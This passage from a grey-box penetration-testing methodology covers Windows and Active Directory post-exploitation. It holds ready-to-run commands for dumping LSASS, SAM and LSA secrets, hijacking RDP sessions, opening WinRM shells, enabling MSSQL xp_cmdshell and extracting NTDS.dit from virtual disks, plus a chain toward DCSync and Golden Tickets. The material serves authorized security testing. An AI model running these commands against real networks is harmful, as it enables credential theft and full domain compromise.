# Method 1 — Task Manager (if GUI): Right-click lsass.exe → Create dump file
# Method 2 — procdump (signed Microsoft tool — less flagged by AV)
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# Method 3 — Mimikatz (high AV detection risk)
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit

# Method 4 — Remote via CrackMapExec (no binary on target needed)
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> -M lsassy
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --lsa

# Parse a dump file offline
pypykatz lsa minidump lsass.dmp
```

**Vulnerable Signs:**
- Cleartext passwords returned → WDigest is enabled → Critical
- Domain admin credentials found in memory → Critical

---

## 14.5 LSASS Protection & Credential Storage Status

```bash
# WDigest — if enabled, cleartext passwords stored in LSASS
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
# Vulnerable if: UseLogonCredential = 1

# LSASS Protected Process Light (PPL)
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
# Protected if: RunAsPPL = 1

# Credential Guard
reg query HKLM\SYSTEM\CurrentControlSet\Control\LSA /v LsaCfgFlags
# Protected if: LsaCfgFlags = 1 or 2

# LAPS (Local Admin Password Solution) installed?
reg query "HKLM\SOFTWARE\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
# If not present or = 0 → LAPS not deployed → local admin reuse likely
```

---

## 14.6 SAM & LSA Secrets Dump (Remote — No Shell Needed)

```bash
# Requires local admin credentials or hash on the target
secretsdump.py <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>

# Or via CrackMapExec
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --sam
crackmapexec smb <IP> -u <USERNAME> -p <PASSWORD> --lsa
```

**What to look for in output:**
- `Administrator:500:<LM_HASH>:<NTLM_HASH>` → local admin hash → test for reuse (Phase 13.2)
- `_SC_<ServiceName>:<PASSWORD>` → service account password in LSA secrets
- `DPAPI_SYSTEM:<HASH>` → can decrypt DPAPI-protected secrets (browser passwords, WiFi keys)

---

# Phase 15 — RDP Testing

## 15.1 NLA & Security Layer

```bash
nmap --script rdp-enum-encryption -p3389 <IP>
```

**Vulnerable Signs:**
- NLA not enforced → login screen exposed before authentication → credential stuffing / brute force risk
- Only classic RDP Security Layer supported → weaker encryption

---

## 15.2 BlueKeep & DejaBlue

```bash
# BlueKeep (CVE-2019-0708) — affects Windows 7, Server 2008
# DejaBlue (CVE-2019-1181/1182) — affects Windows 10, Server 2019
# Detection only — do not run exploit in production

# Metasploit scanner (detection, no exploit):
# msf> use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
# msf> set RHOSTS <IP>
# msf> run
```

---

## 15.3 RDP Session Hijacking

```bash
# Requires SYSTEM-level access on the host

# List active and disconnected sessions
query session /server:<IP>

# Hijack a disconnected session (no credentials needed if SYSTEM)
tscon <SESSION_ID> /dest:<YOUR_SESSION_NAME>
```

**Vulnerable Signs:**
- Privileged users (Domain Admins) have disconnected sessions on hosts → hijackable at SYSTEM
- No session timeout policy → sessions stay alive indefinitely

---

# Phase 16 — WinRM Testing

## 16.1 WinRM Access Test

```bash
# Check availability
curl -i http://<IP>:5985/wsman
curl -ik https://<IP>:5986/wsman

# Test credentials
crackmapexec winrm <IP> -u <USERNAME> -p <PASSWORD>

# If success → interactive shell
evil-winrm -i <IP> -u <USERNAME> -p <PASSWORD>
evil-winrm -i <IP> -u <USERNAME> -H <NTLM_HASH>
```

**Vulnerable Signs:**
- 5985 (HTTP) open → WinRM traffic unencrypted
- 5986 (HTTPS) closed while 5985 is open → no TLS for remote management
- Low-privileged user can connect when they should not be able to

---

# Phase 17 — MSSQL Testing

## 17.1 Discover & Connect

```bash
# Find MSSQL hosts
crackmapexec mssql <CIDR> -u <USERNAME> -p <PASSWORD>
nmap --script ms-sql-info,ms-sql-config -p1433 <IP>

# Interactive client
impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>@<IP> -windows-auth
```

---

## 17.2 MSSQL Privilege & Shell Checks

```sql
-- Check if sysadmin
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');

-- Check if xp_cmdshell is enabled
SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell';
-- If run_value = 1 → already enabled → execute OS commands

-- Execute OS command (if xp_cmdshell enabled)
EXEC xp_cmdshell 'whoami';

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

**Vulnerable Signs:**
- `xp_cmdshell` enabled → OS command execution as SQL service account → Critical
- SQL service running as SYSTEM or a Domain Admin account → Critical escalation path

---

## 17.3 MSSQL Impersonation

```sql
-- Check who you can impersonate
SELECT distinct b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate a higher-privileged SQL user
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-- If sysadmin=1 now → escalated
```

---

## 17.4 MSSQL Linked Servers

```sql
-- Discover linked servers
SELECT * FROM sys.servers WHERE is_linked = 1;

-- Execute on linked server (may run as higher privilege)
EXEC ('SELECT SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')') AT [<LINKED_SERVER>];

-- If sysadmin on linked server:
EXEC ('EXEC xp_cmdshell ''whoami''') AT [<LINKED_SERVER>];
```

**Vulnerable Signs:**
- Linked servers exist → pivot between databases → potential escalation
- Linked server runs with higher privilege than your current context

---

# Phase 18 — SNMP Enumeration

## 18.1 Community String Bruteforce

```bash
onesixtyone -c /usr/share/doc/onesixtyone/dict.txt <IP>
snmpwalk -v1 -c public <IP>
snmpwalk -v2c -c public <IP>
nmap -sU -p161 --script snmp-brute <IP>
```

**If a community string works:**
```bash
# Running processes
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.4.2.1.2
# Installed software
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.25.6.3.1.2
# Network interfaces / IP addresses
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.4.20.1.1
# Open TCP ports
snmpwalk -v2c -c public <IP> 1.3.6.1.2.1.6.13.1.3
```

**Vulnerable Signs:**
- Default community strings (`public`, `private`) accepted → full system disclosure
- Write community string accepted → configuration changes possible → Critical

---

## 18.2 NTLMv1 Detection

```bash
# Check via Responder (passive/analyze mode)
responder -I eth0 -A

# If shell access:
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v LMCompatibilityLevel
```

**Interpreting LMCompatibilityLevel:**

| Value | Authentication Used | Risk |
|-------|-------------------|------|
| 0 | LM + NTLMv1 | Critical — trivially crackable |
| 1 | LM + NTLMv1 + session security | Critical |
| 2 | NTLMv1 | High |
| 3 | NTLMv2 only | Acceptable |
| 4 | NTLMv2 + refuse LM | Good |
| 5 | NTLMv2 + refuse LM/NTLM | Best |

---

# Phase 19 — Domain Trust Enumeration

## 19.1 List Domain Trusts

```bash
# CrackMapExec
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M enum_trusts

# LDAP
ldapsearch -x -H ldap://<DC_IP> -D "<DOMAIN>\<USERNAME>" -w <PASSWORD> \
  -b "CN=System,DC=domain,DC=local" "(objectClass=trustedDomain)" \
  name trustDirection trustType
```

**Trust direction values:**
- `1` = Inbound → other domain trusts you (they can use your resources)
- `2` = Outbound → you trust the other domain (your users can use their resources)
- `3` = Bidirectional → both directions

**Vulnerable Signs:**
- External / forest trust with SID History enabled → SID History injection attack
- Bidirectional trust with less-secured domain → compromise one → pivot across
- Transitive trusts → wider blast radius across forest

---

# Phase 20 — GPO Misconfiguration

## 20.1 List GPOs

```bash
crackmapexec smb <DC_IP> -u <USERNAME> -p <PASSWORD> -M enum_gpo
```

## 20.2 GPO Write Permission Check

```bash
# SYSVOL permissions
smbmap -H <DC_IP> -u <USERNAME> -p <PASSWORD> -R SYSVOL
# Look for directories where your user has WRITE access

# BloodHound — look for "WriteProperty" or "GenericWrite" edges on GPO nodes
```

**Vulnerable Signs:**
- Non-admin has write access to a GPO → can inject code that runs on all machines the GPO applies to
- GPO applies to Domain Controllers → path to DC compromise → Critical

---

# Phase 21 — Hyper-V Specific Testing

## 21.1 Hyper-V Port & Surface Check

```bash
nmap -p2179,6600,5985,5986,443,8443,6516 -sV <HYPERV_HOST>
```

**Port breakdown:**
- `2179` = VMConnect (VM console) → should never be exposed externally
- `6600` = Live Migration → should be isolated to dedicated VLAN
- `5985/5986` = WinRM (management) → should only allow management hosts
- `443/6516` = Windows Admin Center → web-based management panel

**Vulnerable Signs:**
- Any management port reachable from test workstation VLAN without going through jump host
- VMConnect reachable → access VM console without VM credentials

---

## 21.2 Hyper-V Share — Virtual Disk Files

```bash
smbmap -H <HYPERV_HOST> -u <USERNAME> -p <PASSWORD>
# Look for: *.vhd, *.vhdx, *.avhd (checkpoint), *.iso
```

**Vulnerable Signs:**
- Virtual disk files readable → download → mount → access guest OS filesystem
- NTDS.dit from a DC VM accessible → full domain hash extraction without touching DC directly

**If VHD accessible:**
```bash
# Mount VHDX on Linux
sudo apt install libguestfs-tools
guestmount -a <FILE>.vhdx -m /dev/sda1 --ro /mnt/vhd

# Extract SAM/SYSTEM from Windows VM
ls /mnt/vhd/Windows/System32/config/

# Or extract NTDS.dit from DC VM
ls /mnt/vhd/Windows/NTDS/
```

---

## 21.3 Guest-to-Host Network Isolation Check

```bash
# From inside a guest VM (if you have access) — can you reach the Hyper-V host?
ping <HYPERV_HOST_MANAGEMENT_IP>
nmap -Pn -p445,3389,5985,2179 <HYPERV_HOST_MANAGEMENT_IP>
```

**Vulnerable Signs:**
- Guest VM can directly reach Hyper-V host management interface
- No firewall / ACL between guest network and host management interface

---

## 21.4 Windows Admin Center / SCVMM Default Credentials

```bash
whatweb https://<IP>
curl -Ik https://<IP>

# Test with provided credentials and also common defaults:
# admin / admin
# administrator / (blank)
# administrator / admin
```

---

# Phase 22 — Web & Management Panel Testing

## 22.1 TLS Configuration

```bash
testssl.sh <IP>:443
nmap --script ssl-cert,ssl-enum-ciphers -p443,8443 <IP>
```

**Vulnerable Signs:**
- TLS 1.0 / 1.1 supported → downgrade attack surface
- Expired / self-signed certificate
- RC4, DES, NULL, EXPORT cipher suites
- Missing HSTS

---

## 22.2 Security Headers

```bash
curl -Ik https://<IP>
nmap --script http-security-headers -p443 <IP>
```

**Check for and flag if missing:**
- `Strict-Transport-Security` (HSTS)
- `X-Frame-Options`
- `Content-Security-Policy`
- `X-Content-Type-Options`
- `Referrer-Policy`
- `Permissions-Policy`

**Flag if present:**
- `Server: Microsoft-IIS/8.5` → version disclosure → check for known vulns

---

## 22.3 Directory & Content Discovery

```bash
# Unauthenticated
gobuster dir -u https://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt -k -t 30

# Authenticated (use session cookie or basic auth)
gobuster dir -u https://<IP> -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -k -t 30 -H "Cookie: <SESSION_COOKIE>"

# Nikto (comprehensive web scanner)
nikto -h https://<IP> -ssl

# API endpoint discovery
gobuster dir -u https://<IP>/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -k
```

**Vulnerable Signs:**
- Hidden admin paths (`/admin`, `/manager`, `/console`, `/elmah.axd`, `/trace.axd`)
- Backup files (`.bak`, `.old`, `.orig`, `.zip`, `.tar.gz`)
- Config files (`web.config`, `appsettings.json`, `.env`)
- Debug pages serving error details

---

## 22.4 Authenticated Testing on Web Apps

With provided credentials, manually check:

- **Horizontal privilege escalation:** Can you access another user's data by changing a user ID in the URL or request?
  - e.g., `/api/users/123/profile` → change to `/api/users/124/profile`
- **Vertical privilege escalation:** Can you access admin functionality as a regular user?
  - e.g., directly browse to `/admin/panel` while logged in as normal user
- **IDOR:** Change object IDs in requests to access other records
- **Missing authorization on API endpoints:** Test unauthenticated vs. authenticated responses for sensitive APIs

---

# Phase 23 — Automated Credentialed Scanning

## 23.1 Nessus / OpenVAS Credentialed Scan

Configure with the provided domain credentials for a credentialed scan. This finds:
- Missing patches (reads installed software via WMI/registry)
- Local configuration weaknesses
- Weak local policies
- Services with known CVEs

```bash
# OpenVAS from CLI
gvm-start
# Configure via web UI at https://localhost:9392
# Create: Scan → Advanced Scan → Credentials tab → Add Windows credentials
# Policy: "Windows Credentialed Checks"
```

**Capture from report:**
- All Critical / High findings
- CVE identifiers
- CVSS scores
- Affected hosts

---

# Phase 24 — Network Segmentation Validation

## 24.1 What Should Be Restricted — Test Each

```bash
# From your test workstation — what can you reach that you should not?
nmap -Pn -p445,3389,5985,88,389,636 <DC_IP>          # DC — should require jump host
nmap -Pn -p445,3389,5985,2179,6600 <HYPERV_HOST_IP>  # Hyper-V host
nmap -Pn -p445,3389,1433 <PROD_SERVER_IP>             # Production servers
nmap -Pn -p445,3389 <OTHER_WORKSTATION_IP>            # Lateral movement between workstations
```

**Vulnerable Signs:**
- Test workstation can directly reach DC management ports (no jump host required)
- Hyper-V host directly reachable from user VLAN
- No east-west firewall between workstations (workstation→workstation SMB/RDP allowed)
- Production DB ports reachable from user VLAN directly

---

# Phase 25 — Persistence (Document Only)

> ⚠️ **Persistence mechanisms must be explicitly authorized in the rules of engagement.** Document the technique as a finding — do not implant unless the scope document specifically permits it.

**Persistence paths to document as findings if conditions are met:**

| Technique | Condition | Impact |
|-----------|-----------|--------|
| Golden Ticket | krbtgt hash obtained | TGTs forged for any user, valid for 10 years |
| Silver Ticket | Service account hash | Forged TGS for specific services |
| Skeleton Key | LSASS write access | All accounts accept master password |
| DC Shadow | Domain replication rights | Push arbitrary AD changes as rogue DC |
| AdminSDHolder ACL | GenericAll on AdminSDHolder | Backdoor admin access every 60 mins |
| DSRM Admin | Local admin on DC | Boot to DSRM → local admin access offline |

---

# Evidence Collection

Every finding must be documented with:

| Field | Required |
|-------|---------|
| Test performed | ✅ |
| Full command used | ✅ |
| Raw tool output | ✅ |
| Screenshot | ✅ |
| Timestamp (UTC) | ✅ |
| Target IP / Hostname | ✅ |
| User account used during test | ✅ |
| CVE / Reference | If applicable |
| CVSS Score | ✅ |
| Impact statement | ✅ |
| Reproduction steps | ✅ |
| Remediation recommendation | ✅ |

---

# Risk Rating Reference

| Rating | CVSS | Examples |
|--------|------|---------|
| Critical | 9.0–10.0 | DCSync achieved, Golden Ticket possible, ESC1 domain compromise, local admin reuse on all hosts |
| High | 7.0–8.9 | Kerberoast cracked DA account, GPP passwords in SYSVOL, NTLM relay to admin, NoPac/ZeroLogon |
| Medium | 4.0–6.9 | Kerberoastable svc accounts (uncracked), NLA missing on RDP, SNMP public, WDigest enabled |
| Low | 0.1–3.9 | Password in LDAP description field, stale accounts enabled, version disclosure |
| Informational | N/A | Unnecessary services, weak GPO defaults, LAPS not deployed |

---

# Attack Chain — Full Grey Box Path Reference

```
Provided Low-Priv Domain Creds
         │
         ├──► BloodHound — map shortest path to DA
         ├──► Kerberoasting — request & crack SPN hashes
         ├──► AS-REP Roasting — no-preauth accounts
         ├──► GPP Passwords in SYSVOL (cpassword)
         ├──► Password Spray (verify lockout first)
         ├──► Passwords in LDAP description fields
         ├──► Share hunting — credentials in files
         ├──► MSSQL — xp_cmdshell / linked servers
         ├──► ACL Abuse (GenericAll/WriteDACL/ForceChangePassword)
         ├──► DnsAdmins → DLL injection → SYSTEM on DC
         ├──► ADCS — Certipy ESC1-8
         ├──► NTLM Relay — Responder / mitm6 + ntlmrelayx
         ├──► Coerce → Relay → ADCS → DC cert → DCSync
         │
         ▼
    Local Admin / Service Account Compromised
         │
         ├──► PTH across all hosts (crackmapexec)
         ├──► Local Admin Reuse check
         ├──► LSASS dump → cleartext creds / more hashes
         ├──► SAM / LSA secrets dump → more accounts
         ├──► Token privilege abuse (Potato → SYSTEM)
         │
         ▼
    Domain Admin / DCSync Rights Obtained
         │
         ├──► secretsdump.py → all hashes
         ├──► krbtgt hash → Golden Ticket possible
         └──► Full Domain Compromise — document & stop
```

---

# Master Checklist

**Phase 1 — Enumeration**
- [ ] Host discovery (TCP + UDP + ARP)
- [ ] OS fingerprinting
- [ ] Full TCP + targeted UDP scan
- [ ] Service and version detection

**Phase 2 — Credential Validation**
- [ ] Validate creds across all hosts via CME
- [ ] Check current user rights, groups, privileges

**Phase 3 — Active Directory**
- [ ] BloodHound / SharpHound collection and attack path analysis
- [ ] ldapdomaindump full AD dump
- [ ] Password policy (default + PSO fine-grained)
- [ ] AdminCount / AdminSDHolder accounts
- [ ] Passwords in description fields
- [ ] Stale and inactive accounts

**Phase 4 — SMB Authenticated**
- [ ] Share enumeration and permission review
- [ ] GPP / cpassword in SYSVOL
- [ ] Sensitive file discovery in shares
- [ ] SMB relay target list generation

**Phase 5 — Kerberos**
- [ ] Kerberoasting (SPN account list + hash extraction)
- [ ] AS-REP Roasting
- [ ] Unconstrained delegation hosts
- [ ] Constrained delegation accounts
- [ ] RBCD (machine account quota + writable computer objects)

**Phase 6 — Password Attacks**
- [ ] Password spray (confirm lockout policy first)
- [ ] Offline cracking (Kerberoast, AS-REP, NTLM, NTLMv2)

**Phase 7 — ACL Abuse**
- [ ] BloodHound ACL edge review from owned principals
- [ ] GenericAll / WriteDACL / ForceChangePassword / AddMember exploitation

**Phase 8 — DNS Admin**
- [ ] DnsAdmins group membership check
- [ ] DLL injection via DNS if member

**Phase 9 — ADCS**
- [ ] Certipy full enumeration
- [ ] ESC1–ESC8 check and exploitation where applicable

**Phase 10–11 — Relay & Coerce**
- [ ] NTLM relay (Responder + ntlmrelayx)
- [ ] IPv6 relay (mitm6)
- [ ] Coerce → ADCS → DCSync chain

**Phase 12 — DCSync**
- [ ] DCSync if rights obtained
- [ ] krbtgt hash obtained?

**Phase 13–14 — Lateral Movement & Post-Exploitation**
- [ ] Pass-the-Hash across all hosts
- [ ] Local admin reuse check (--local-auth)
- [ ] Remote execution (WMI / WinRM / SMBExec)
- [ ] Token privilege abuse (SeImpersonate → SYSTEM)
- [ ] LSASS credential dump
- [ ] SAM / LSA secrets dump
- [ ] WDigest / Credential Guard / LAPS status

**Phase 15 — RDP**
- [ ] NLA enforcement check
- [ ] BlueKeep / DejaBlue detection
- [ ] Disconnected session hijacking surface

**Phase 17 — MSSQL**
- [ ] xp_cmdshell enabled check
- [ ] Impersonation rights
- [ ] Linked server abuse

**Phase 18 — SNMP**
- [ ] Community string bruteforce
- [ ] Full system info extraction if community found
- [ ] NTLMv1 detection

**Phase 19–20 — Trusts & GPO**
- [ ] Domain trust enumeration
- [ ] GPO write permission check

**Phase 21 — Hyper-V**
- [ ] Management port exposure
- [ ] VHD/VHDX share access
- [ ] Guest-to-host network isolation
- [ ] Admin Center / SCVMM default creds

**Phase 22 — Web Panels**
- [ ] TLS and certificate check
- [ ] Security headers
- [ ] Directory brute force (unauthenticated + authenticated)
- [ ] Privilege escalation in web apps

**Phase 23 — Automated**
- [ ] Nessus / OpenVAS credentialed scan

**Phase 24 — Segmentation**
- [ ] Network segment isolation validation
- [ ] East-west movement between workstations

**Final**
- [ ] Full attack chain documented end-to-end
- [ ] Evidence captured for every finding
- [ ] Remediation recommendations written for all findings
